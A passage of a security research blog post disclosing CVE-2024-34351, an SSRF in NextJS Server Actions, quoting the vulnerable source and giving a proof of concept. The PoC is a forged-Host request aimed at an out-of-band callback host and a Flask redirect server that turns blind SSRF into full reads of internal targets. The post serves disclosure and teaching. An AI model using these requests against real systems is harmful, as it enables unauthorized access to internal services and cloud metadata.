class="hljs-keyword">q</span>=<span class="hljs-number">75</span></code></pre></div><p>‍</p><h3>Digging Deeper - SSRF in Server Actions<br></h3><p>While many people think of NextJS as a 'client side' library, NextJS provides a fully featured server side framework with Server Actions. This allows writing JS code that will be executed asynchronously on the server when called. This allows developers to create APIs directly within NextJS without having to have a separate backend, and because it's part of the same codebase you get all the type safety associated with using TypeScript. However, this server side functionality provides a large attack surface for bugs.<br></p><p>While auditing the NextJS source, we came across something interesting. If you call a server action and it responds with a redirect, it calls the following function:<br></p><div class="w-embed"><pre><code class="language-js hljs language-javascript" data-highlighted="yes"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createRedirectRenderResult</span>(<span class="hljs-params">
  req: IncomingMessage,
  res: ServerResponse,
  redirectUrl: string,
  basePath: string,
  staticGenerationStore: StaticGenerationStore
</span>) {
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">'x-action-redirect'</span>, redirectUrl)
  <span class="hljs-comment">// if we're redirecting to a relative path, we'll try to stream the response</span>
  <span class="hljs-keyword">if</span> (redirectUrl.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/'</span>)) {
    <span class="hljs-keyword">const</span> forwardedHeaders = <span class="hljs-title function_">getForwardedHeaders</span>(req, res)
    forwardedHeaders.<span class="hljs-title function_">set</span>(<span class="hljs-variable constant_">RSC_HEADER</span>, <span class="hljs-string">'1'</span>)

    <span class="hljs-keyword">const</span> host = req.<span class="hljs-property">headers</span>[<span class="hljs-string">'host'</span>]
    <span class="hljs-keyword">const</span> proto =
      staticGenerationStore.<span class="hljs-property">incrementalCache</span>?.<span class="hljs-property">requestProtocol</span> || <span class="hljs-string">'https'</span>
    <span class="hljs-keyword">const</span> fetchUrl = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">`<span class="hljs-subst">${proto}</span>://<span class="hljs-subst">${host}</span><span class="hljs-subst">${basePath}</span><span class="hljs-subst">${redirectUrl}</span>`</span>)
    <span class="hljs-comment">// .. snip ..</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> headResponse = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(fetchUrl, {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'HEAD'</span>,
        <span class="hljs-attr">headers</span>: forwardedHeaders,
        <span class="hljs-attr">next</span>: {
          <span class="hljs-comment">// @ts-ignore</span>
          <span class="hljs-attr">internal</span>: <span class="hljs-number">1</span>,
        },
      })

      <span class="hljs-keyword">if</span> (
        headResponse.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'content-type'</span>) === <span class="hljs-variable constant_">RSC_CONTENT_TYPE_HEADER</span>
      ) {
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(fetchUrl, {
          <span class="hljs-attr">method</span>: <span class="hljs-string">'GET'</span>,
          <span class="hljs-attr">headers</span>: forwardedHeaders,
          <span class="hljs-attr">next</span>: {
            <span class="hljs-comment">// @ts-ignore</span>
            <span class="hljs-attr">internal</span>: <span class="hljs-number">1</span>,
          },
        })
        <span class="hljs-comment">// .. snip ..</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FlightRenderResult</span>(response.<span class="hljs-property">body</span>!)
      }
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-comment">// .. snip ..</span>
    }
  }

  <span class="hljs-keyword">return</span> <span class="hljs-title class_">RenderResult</span>.<span class="hljs-title function_">fromStatic</span>(<span class="hljs-string">'{}'</span>)
}
</code></pre></div><p>What is interesting is that instead of returning the redirect directly to the client, if the redirect starts with <span class="code_single-line">/</span> (for example, a redirect to <span class="code_single-line">/login</span>) the server will fetch the result of the redirect <em>_server side_</em>, then return it back to the client. However, looking closely, we see that the Host header is taken from the client:</p><div class="w-embed"><pre><code class="language-js hljs language-javascript" data-highlighted="yes"><span class="hljs-keyword">const</span> host = req.<span class="hljs-property">headers</span>[<span class="hljs-string">'host'</span>]
<span class="hljs-keyword">const</span> proto =
  staticGenerationStore.<span class="hljs-property">incrementalCache</span>?.<span class="hljs-property">requestProtocol</span> || <span class="hljs-string">'https'</span>
<span class="hljs-keyword">const</span> fetchUrl = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">`<span class="hljs-subst">${proto}</span>://<span class="hljs-subst">${host}</span><span class="hljs-subst">${basePath}</span><span class="hljs-subst">${redirectUrl}</span>`</span>)
</code></pre></div><p>This means that if we forge a host header pointing to an internal host, NextJS will try and fetch the reponse from that host instead of the app itself, leading to an SSRF.</p><p>To recap, to be vulnerable to this SSRF, we require that:</p><p>- A server action is defined;</p><p>- The server action redirects to a URL starting with <span class="code_single-line">/</span>;</p><p>- We are able to specify a custom Host header while accessing the application.</p><p>Let's run through a simple example locally. Suppose we have an app with a simple search function that only works if the user is logged in:</p><div class="w-embed"><pre><code class="language-js hljs language-javascript" data-highlighted="yes"><span class="hljs-string">"use server"</span>;

<span class="hljs-keyword">import</span> { redirect } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/navigation"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSearch</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">data: FormData</span>) =&gt; {
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">userIsLoggedIn</span>()) {
    <span class="hljs-title function_">redirect</span>(<span class="hljs-string">"/login"</span>);
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-comment">// .. do other stuff ..</span>
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">userIsLoggedIn</span>(<span class="hljs-params"></span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre></div><p>‍</p><p>If we send a request to this search endpoint via the UI, we can intercept the request and see its structure:</p><div class="w-embed"><pre><code class="language-http hljs" data-highlighted="yes"><span class="hljs-keyword">POST</span> <span class="hljs-string">/en/search/hello</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:3000
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>375
<span class="hljs-attribute">Next-Router-State-Tree</span><span class="hljs-punctuation">: </span>%5B%22%22%2C%7B%22children%22%3A%5B%22en%22%2C%7B%22children%22%3A%5B%22search%22%2C%7B%22children%22%3A%5B%5B%22search%22%2C%22hello%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%5D
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryU0TPI3bwEtnXc1vB
<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/x-component
<span class="hljs-attribute">Next-Action</span><span class="hljs-punctuation">: </span>15531bfa07ff11369239544516d26edbc537ff9c
<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:3000
<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-GB,en-US;q=0.9,en;q=0.8
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close

&lt; ... snip ... &gt;

</code></pre></div><p>The important thing here is the <span class="code_single-line">Next-Action</span> ID. This is used by NextJS to uniquely identify the action we want to take. In fact, the URL and path does not matter at all - as long as we pass the <span class="code_single-line">Next-Action</span> header, we'll trigger the action.</p><p>To trigger the bug, let's use this <span class="code_single-line">Next-Action</span> ID to create a minimal PoC:
</p><div class="w-embed"><pre><code class="language-http hljs" data-highlighted="yes"><span class="hljs-keyword">POST</span> <span class="hljs-string">/x</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>kwk4ufof0q3hdki5e46mpchscjia69uy.oastify.com
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>4
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
<span class="hljs-attribute">Next-Action</span><span class="hljs-punctuation">: </span>15531bfa07ff11369239544516d26edbc537ff9c
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close

{}
</code></pre></div><p>Note that here, we have changed our host to our Burp Collaborator instance. And indeed, we can see we get a ping back - here's the request that NextJS sends to us:</p><div class="w-embed"><pre><code class="language-http hljs" data-highlighted="yes"><span class="hljs-keyword">HEAD</span> <span class="hljs-string">/login</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">host</span><span class="hljs-punctuation">: </span>kwk4ufof0q3hdki5e46mpchscjia69uy.oastify.com
<span class="hljs-attribute">connection</span><span class="hljs-punctuation">: </span>close
<span class="hljs-attribute">cache-control</span><span class="hljs-punctuation">: </span>no-cache, no-store, max-age=0, must-revalidate
<span class="hljs-attribute">cookie</span><span class="hljs-punctuation">: </span>; undefined
<span class="hljs-attribute">next-action</span><span class="hljs-punctuation">: </span>15531bfa07ff11369239544516d26edbc537ff9c
<span class="hljs-attribute">rsc</span><span class="hljs-punctuation">: </span>1
<span class="hljs-attribute">user-agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
<span class="hljs-attribute">vary</span><span class="hljs-punctuation">: </span>RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url
<span class="hljs-attribute">x-action-redirect</span><span class="hljs-punctuation">: </span>/login
<span class="hljs-attribute">x-action-revalidated</span><span class="hljs-punctuation">: </span>[[],0,0]
<span class="hljs-attribute">x-forwarded-for</span><span class="hljs-punctuation">: </span>::ffff:127.0.0.1
<span class="hljs-attribute">x-forwarded-host</span><span class="hljs-punctuation">: </span>kwk4ufof0q3hdki5e46mpchscjia69uy.oastify.com
<span class="hljs-attribute">x-forwarded-port</span><span class="hljs-punctuation">: </span>3000
<span class="hljs-attribute">x-forwarded-proto</span><span class="hljs-punctuation">: </span>http
<span class="hljs-attribute">accept</span><span class="hljs-punctuation">: </span>*/*
<span class="hljs-attribute">accept-language</span><span class="hljs-punctuation">: </span>*
<span class="hljs-attribute">sec-fetch-mode</span><span class="hljs-punctuation">: </span>cors
<span class="hljs-attribute">accept-encoding</span><span class="hljs-punctuation">: </span>gzip, deflate
</code></pre></div><p>We have a working blind SSRF! However, we can do better. Let's revisit the logic of exactly what requests NextJS makes:</p><div class="w-embed"><pre><code class="language-js hljs language-javascript" data-highlighted="yes"><span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> headResponse = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(fetchUrl, {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'HEAD'</span>,
        <span class="hljs-attr">headers</span>: forwardedHeaders,
        <span class="hljs-attr">next</span>: {
          <span class="hljs-comment">// @ts-ignore</span>
          <span class="hljs-attr">internal</span>: <span class="hljs-number">1</span>,
        },
      })

      <span class="hljs-keyword">if</span> (
        headResponse.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'content-type'</span>) === <span class="hljs-variable constant_">RSC_CONTENT_TYPE_HEADER</span>
      ) {
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(fetchUrl, {
          <span class="hljs-attr">method</span>: <span class="hljs-string">'GET'</span>,
          <span class="hljs-attr">headers</span>: forwardedHeaders,
          <span class="hljs-attr">next</span>: {
            <span class="hljs-comment">// @ts-ignore</span>
            <span class="hljs-attr">internal</span>: <span class="hljs-number">1</span>,
          },
        })
        <span class="hljs-comment">// .. snip ..</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FlightRenderResult</span>(response.<span class="hljs-property">body</span>!)
      }
    } <span class="hljs-keyword">catch</span> (err) {
      <span class="hljs-comment">// .. snip ..</span>
    }
</code></pre></div><p>The logic is as follows:<br></p><p>- The server first does a preflight HEAD request to the URL.</p><p>- If the preflight returns a <span class="code_single-line">Content-Type</span> header of <span class="code_single-line">RSC_CONTENT_TYPE_HEADER</span>, which is <span class="code_single-line">text/x-component</span>, then NextJS makes a GET request to the same URL.</p><p>- The content of that GET request is then returned in the response.</p><p>Of course, it's unlikely that any of our SSRF targets (like cloud metadata endpoints) would return that content type, so what can be done? We can satisfy these checks and turn our SSRF into a full read as follows:<br></p><p>- Set up a server that takes requests on any path.</p><p>- On any HEAD request, return a 200 with <span class="code_single-line">Content-Type: text/x-component</span>.</p><p>- On a GET request, return a 302 to our intended SSRF target (such as <span class="code_single-line">metadata.internal</span> or the like)</p><p>- When NextJS fetches from our server, it will satisfy the preflight check on our HEAD request, but will follow the redirect on GET, giving us a full read SSRF!</p><p>Here's a simple Flask example:</p><div class="w-embed"><pre><code class="language-python hljs" data-highlighted="yes"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response, request, redirect
app = Flask(__name__)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span>, defaults={<span class="hljs-string">'path'</span>: <span class="hljs-string">''</span>}</span>)</span>
<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/&lt;path:path&gt;'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">catch</span>(<span class="hljs-params">path</span>):
    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'HEAD'</span>:
        resp = Response(<span class="hljs-string">""</span>)
        resp.headers[<span class="hljs-string">'Content-Type'</span>] = <span class="hljs-string">'text/x-component'</span>
        <span class="hljs-keyword">return</span> resp
    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">'https://example.com'</span>)

</code></pre></div><p>Changing our <span class="code_single-line">Host</span> header to point to our malicious Flask server then gives us the full content of <span class="code_single-line">example.com</span>, as expected:</p><figure style="max-width:2386pxpx" class="w-richtext-align-fullwidth w-richtext-figure-type-image"><div><img src="https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/662843388988fa96b13fc00b_image%20(10).png" loading="lazy" alt=""></div></figure><p>We reported this SSRF to NextJS and it was fixed in <span class="code_single-line">v14.1.1</span>. </p><p>This vulnerability was assigned CVE-2024-34351 and you can find the advisory here: <a href="https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g">https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g</a></p><h3>Conclusion</h3><p>As the world increasingly adopts static single-page apps and frameworks, it may be tempting to overlook testing them. The term 'static' might imply a lack of functionality and minimal risk. Yet, these frameworks often rely on numerous underlying APIs and logic, presenting a considerable attack surface.</p><p>Ultimately, vulnerabilities such as the one above highlight that modern frameworks are not a complete solution to the security challenges faced by earlier CMS technologies. </p></div><div class="padding-section-small"><div><div><div class="text-size-small">Written by:</div></div><div class="w-dyn-list"><div role="list" class="w-dyn-items"><div role="listitem" class="w-dyn-item"><div>Adam Kues</div></div><div role="listitem" class="w-dyn-item"><div>Shubham Shah</div></div></div></div></div></div></div></div></div></div></div></header><div><section class="section_blog-post1-cta"><div class="padding-global"><div class="container-small"><div class="padding-section-large"><div class="text-align-center"><div class="w-embed w-script"><!-- Begin Brevo Form -->
<!-- START - We recommend to place the below code in head tag of your website html  -->
<style>
  @font-face {
    font-display: block;
    font-family: Roboto;
    src: url(https://assets.brevo.com/font/Roboto/Latin/normal/normal/7529907e9eaf8ebb5220c5f9850e3811.woff2) format("woff2"), url(https://assets.brevo.com/font/Roboto/Latin/normal/normal/25c678feafdc175a70922a116c9be3e7.woff) format("woff")
  }

  @font-face {
    font-display: fallback;
    font-family: Roboto;
    font-weight: 600;
    src: url(https://assets.brevo.com/font/Roboto/Latin/medium/normal/6e9caeeafb1f3491be3e32744bc30440.woff2) format("woff2"), url(https://assets.brevo.com/font/Roboto/Latin/medium/normal/71501f0d8d5aa95960f6475d5487d4c2.woff) format("woff")
  }

  @font-face {
    font-display: fallback;
    font-family: Roboto;
    font-weight: 700;
    src: url(https://assets.brevo.com/font/Roboto/Latin/bold/normal/3ef7cf158f310cf752d5ad08cd0e7e60.woff2) format("woff2"), url(https://assets.brevo.com/font/Roboto/Latin/bold/normal/ece3a1d82f18b60bcce0211725c476aa.woff) format("woff")
  }

  #sib-container input:-ms-input-placeholder {
    text-align: left;
    font-family: "Helvetica", sans-serif;
    color: #c0ccda;
  }

  #sib-container input::placeholder {
    text-align: left;
    font-family: "Helvetica", sans-serif;
    color: #c0ccda;
  }

  #sib-container textarea::placeholder {
    text-align: left;
    font-family: "Helvetica", sans-serif;
    color: #c0ccda;
  }
</style>
<link rel="stylesheet" href="https://sibforms.com/forms/end-form/build/sib-styles.css">
<!--  END - We recommend to place the above code in head tag of your website html -->

<!-- START - We recommend to place the below code where you want the form in your website html  -->
<div class="sib-form" style="text-align: center;
         background-color: #f7f7f7;                                 ">
  <div id="sib-form-container" class="sib-form-container">
    <div id="error-message" class="sib-form-message-panel" style="font-size:16px; text-align:left; font-family:&quot;Helvetica&quot;, sans-serif; color:#661d1d; background-color:#ffeded; border-radius:3px; border-color:#ff4949;max-width:540px;">
      <div class="sib-form-message-panel__text sib-form-message-panel__text--center">
        <svg viewBox="0 0 512 512" class="sib-icon sib-notification__icon">
          <path d="M256 40c118.621 0 216 96.075 216 216 0 119.291-96.61 216-216 216-119.244 0-216-96.562-216-216 0-119.203 96.602-216 216-216m0-32C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm-11.49 120h22.979c6.823 0 12.274 5.682 11.99 12.5l-7 168c-.268 6.428-5.556 11.5-11.99 11.5h-8.979c-6.433 0-11.722-5.073-11.99-11.5l-7-168c-.283-6.818 5.167-12.5 11.99-12.5zM256 340c-15.464 0-28 12.536-28 28s12.536 28 28 28 28-12.536 28-28-12.536-28-28-28z"></path>
        </svg>
        <span class="sib-form-message-panel__inner-text">
                          Your subscription could not be saved. Please try again.
                      </span>
      </div>
    </div>
    <div></div>
    <div id="success-message" class="sib-form-message-panel" style="font-size:16px; text-align:left; font-family:&quot;Helvetica&quot;, sans-serif; color:#085229; background-color:#e7faf0; border-radius:3px; border-color:#13ce66;max-width:540px;">
      <div class="sib-form-message-panel__text sib-form-message-panel__text--center">
        <svg viewBox="0 0 512 512" class="sib-icon sib-notification__icon">
          <path d="M256 8C119.033 8 8 119.033 8 256s111.033 248 248 248 248-111.033 248-248S392.967 8 256 8zm0 464c-118.664 0-216-96.055-216-216 0-118.663 96.055-216 216-216 118.664 0 216 96.055 216 216 0 118.663-96.055 216-216 216zm141.63-274.961L217.15 376.071c-4.705 4.667-12.303 4.637-16.97-.068l-85.878-86.572c-4.667-4.705-4.637-12.303.068-16.97l8.52-8.451c4.705-4.667 12.303-4.637 16.97.068l68.976 69.533 163.441-162.13c4.705-4.667 12.303-4.637 16.97.068l8.451 8.52c4.668 4.705 4.637 12.303-.068 16.97z"></path>
        </svg>
        <span class="sib-form-message-panel__inner-text">
                          Your subscription has been successful.
                      </span>
      </div>
    </div>
    <div></div>
    <div id="sib-container" class="sib-container--large sib-container--vertical" style="text-align:center; background-color:rgba(255,255,255,1); max-width:540px; border-radius:3px; border-width:1px; border-color:#C0CCD9; border-style:solid; direction:ltr">
      <form id="sib-form" method="POST" action="https://ed1b856c.sibforms.com/serve/MUIFADbqliL372ww_wV8K3yjo9dKABEfAcAsdECtuheZqryvhemb-DfJbfS9e_N5J4tKiyg9IJp93lT1q4dLPZgSjy1nBNbNKB-M7oiRfMuW6BXt_x5FgeinpIfQPsRt-kABj5E87IJfQlhzmS9OvEmB4G2Wun78Iw51pW9qfEq-LdvvolU_f1Vst_lslwCjOrXAmv4JMdXwuGQ1" data-type="subscription" novalidate="true">
        <div style="padding: 8px 0;">
          <div class="sib-form-block" style="font-size:32px; text-align:left; font-weight:700; font-family:&quot;Helvetica&quot;, sans-serif; color:#3C4858; background-color:transparent; text-align:left">
            <p>Get updates on our research</p>
          </div>
        </div>
        <div style="padding: 8px 0;">
          <div class="sib-form-block" style="font-size:16px; text-align:left; font-family:&quot;Helvetica&quot;, sans-serif; color:#3C4858; background-color:transparent; text-align:left">
            <div class="sib-text-form-block">
              <p>Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!</p>
            </div>
          </div>
        </div>
        <div style="padding: 8px 0;">
          <div class="sib-input sib-form-block">
            <div class="form__entry entry_block">
              <div class="form__label-row ">
                <label class="entry__label" style="font-weight: 700; text-align:left; font-size:16px; text-align:left; font-weight:700; font-family:&quot;Helvetica&quot;, sans-serif; color:#3c4858;" for="EMAIL" data-required="*">Enter your email address to subscribe</label>

                <div class="entry__field">
                  <input class="input " type="text" id="EMAIL" name="EMAIL" autocomplete="off" placeholder="Your favorite email" data-required="true" required="">
                </div>
              </div>

              <label class="entry__error entry__error--primary" style="font-size:16px; text-align:left; font-family:&quot;Helvetica&quot;, sans-serif; color:#661d1d; background-color:#ffeded; border-radius:3px; border-color:#ff4949;">
              </label>
              <label class="entry__specification" style="font-size:12px; text-align:left; font-family:&quot;Helvetica&quot;, sans-serif; color:#8390A4; text-align:left">
                Provide your email address to subscribe. For e.g abc@xyz.com
              </label>
            </div>
          </div>
        </div>
        <div style="padding: 8px 0;">
          <div class="sib-form-block" style="text-align: left">
            <button class="sib-form-block__button sib-form-block__button-with-loader" style="font-size:16px; text-align:left; font-weight:700; font-family:&quot;Helvetica&quot;, sans-serif; color:#FFFFFF; background-color:#3766de; border-radius:20px; border-width:0px;" form="sib-form" type="submit">
              <svg class="icon clickable__icon progress-indicator__icon sib-hide-loader-icon" viewBox="0 0 512 512">
                <path d="M460.116 373.846l-20.823-12.022c-5.541-3.199-7.54-10.159-4.663-15.874 30.137-59.886 28.343-131.652-5.386-189.946-33.641-58.394-94.896-95.833-161.827-99.676C261.028 55.961 256 50.751 256 44.352V20.309c0-6.904 5.808-12.337 12.703-11.982 83.556 4.306 160.163 50.864 202.11 123.677 42.063 72.696 44.079 162.316 6.031 236.832-3.14 6.148-10.75 8.461-16.728 5.01z"></path>
              </svg>
              SUBSCRIBE
            </button>
          </div>
        </div>

        <input type="text" name="email_address_check" value="" class="input--hidden" aria-hidden="true">
        <input type="hidden" name="locale" value="en">
      </form>
    </div>
  </div>
</div>
<!-- END - We recommend to place the below code where you want the form in your website html  -->

<!-- START - We recommend to place the below code in footer or bottom of your website html  -->
<script>
  window.REQUIRED_CODE_ERROR_MESSAGE = 'Please choose a country code';
  window.LOCALE = 'en';
  window.EMAIL_INVALID_MESSAGE = window.SMS_INVALID_MESSAGE = "The information provided is invalid. Please review the field format and try again.";

  window.REQUIRED_ERROR_MESSAGE = "This field cannot be left blank. ";

  window.GENERIC_INVALID_MESSAGE = "The information provided is invalid. Please review the field format and try again.";




  window.translation = {
    common: {
      selectedList: '{quantity} list selected',
      selectedLists: '{quantity} lists selected'
    }
  };

  var AUTOHIDE = Boolean(0);
</script>
<script defer="" src="https://sibforms.com/forms/end-form/build/main.js"></script>


<!-- END - We recommend to place the above code in footer or bottom of your website html  -->
<!-- End Brevo Form --></div></div></div></div></div></section></div><section class="section_blog56"><div class="padding-global"><div class="container-large"><div class="padding-section-medium"><div class="padding-bottom padding-small"><div class="gradient-text-2"><h3 class="heading-style-h6">More Like This</h3></div></div><div class="padding-bottom padding-small"><div class="w-dyn-list"><div fs-cmsload-element="list" fs-cmsfilter-element="list" role="list" class="blog10_list w-dyn-items"><div role="listitem" class="w-dyn-item"><a href="/resources/research/two-bytes-is-plenty-fortigate-rce-with-cve-2024-21762" class="research1_card w-inline-block"><div class="resources-card-padding-1 z-index-10"><div class="padding-xsmall"><div class="blog10_meta-wrapper on-card"><div style="background-color:#3766de" class="research1_category-link"><div fs-cmsfilter-field="category">Security Research</div></div><div class="blog10_category-link resource-feature new w-condition-invisible"><div>New!</div></div></div><div class="blog10_title-link"><h3 class="heading-style-h5 line-height-1-2">Two Bytes is Plenty: FortiGate RCE with CVE-2024-21762</h3></div></div><div class="padding-xsmall sides-only"><div class="blog10_button-wrapper"><div class="button is-link is-alternate is-icon w-condition-invisible"><div>Read more</div><div class="icon-embed-xxsmall w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
</svg></div></div><div class="button is-link is-alternate is-icon"><div>Read on ASN Blog</div><div class="icon-embed-xxsmall w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
</svg></div></div></div></div></div><div class="research1_blur-hover" style="transform: translate3d(-30%, -20%, 0px) scale3d(0.8, 0.8, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg); transform-style: preserve-3d; opacity: 0;"></div></a></div><div role="listitem" class="w-dyn-item"><a href="/resources/research/continuing-the-citrix-saga-cve-2023-5914-cve-2023-6184" class="research1_card w-inline-block"><div class="resources-card-padding-1 z-index-10"><div class="padding-xsmall"><div class="blog10_meta-wrapper on-card"><div style="background-color:#3766de" class="research1_category-link"><div fs-cmsfilter-field="category">Security Research</div></div><div class="blog10_category-link resource-feature new w-condition-invisible"><div>New!</div></div></div><div class="blog10_title-link"><h3 class="heading-style-h5 line-height-1-2">Continuing the Citrix Saga: CVE-2023-5914 &amp; CVE-2023-6184</h3></div></div><div class="padding-xsmall sides-only"><div class="blog10_button-wrapper"><div class="button is-link is-alternate is-icon w-condition-invisible"><div>Read more</div><div class="icon-embed-xxsmall w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
</svg></div></div><div class="button is-link is-alternate is-icon"><div>Read on ASN Blog</div><div class="icon-embed-xxsmall w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
</svg></div></div></div></div></div><div class="research1_blur-hover" style="transform: translate3d(-30%, -20%, 0px) scale3d(0.8, 0.8, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg); transform-style: preserve-3d; opacity: 0;"></div></a></div><div role="listitem" class="w-dyn-item"><a href="/resources/research/ivantis-pulse-connect-secure-auth-bypass-round-two" class="research1_card w-inline-block"><div class="resources-card-padding-1 z-index-10"><div class="padding-xsmall"><div class="blog10_meta-wrapper on-card"><div style="background-color:#3766de" class="research1_category-link"><div fs-cmsfilter-field="category">Security Research</div></div><div class="blog10_category-link resource-feature new w-condition-invisible"><div>New!</div></div></div><div class="blog10_title-link"><h3 class="heading-style-h5 line-height-1-2">Ivanti's Pulse Connect Secure Auth Bypass Round Two</h3></div></div><div class="padding-xsmall sides-only"><div class="blog10_button-wrapper"><div class="button is-link is-alternate is-icon w-condition-invisible"><div>Read more</div><div class="icon-embed-xxsmall w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
</svg></div></div><div class="button is-link is-alternate is-icon"><div>Read on ASN Blog</div><div class="icon-embed-xxsmall w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
</svg></div></div></div></div></div><div class="research1_blur-hover" style="transform: translate3d(-30%, -20%, 0px) scale3d(0.8, 0.8, 1) rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg); transform-style: preserve-3d; opacity: 0;"></div></a></div><div role="listitem" class="w-dyn-item"><a href="/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce" class="research1_card w-inline-block"><div class="resources-card-padding-1 z-index-10"><div class="padding-xsmall"><div class="blog10_meta-wrapper on-card"><div style="background-color:#3766de" class="research1_category-link"><div fs-cmsfilter-field="category">Security Research</div></div><div class="blog10_category-link resource-feature new w-condition-invisible"><div>New!</div></div></div><div class="blog10_title-link"><h3 class="heading-style-h5 line-height-1-2">High Signal Detection and Exploitation of Ivanti's Pulse Connect Secure Auth Bypass &amp; RCE</h3></div></div><div class="padding-xsmall sides-only"><div class="blog10_button-wrapper"><div class="button is-link is-alternate is-icon w-condition-invisible"><div>Read more</div><div class="icon-embed-xxsmall w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
</svg></div></div><div class="button is-link is-alternate is-icon"><div>Read on ASN Blog</div><div class="icon-embed-xxsmall w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
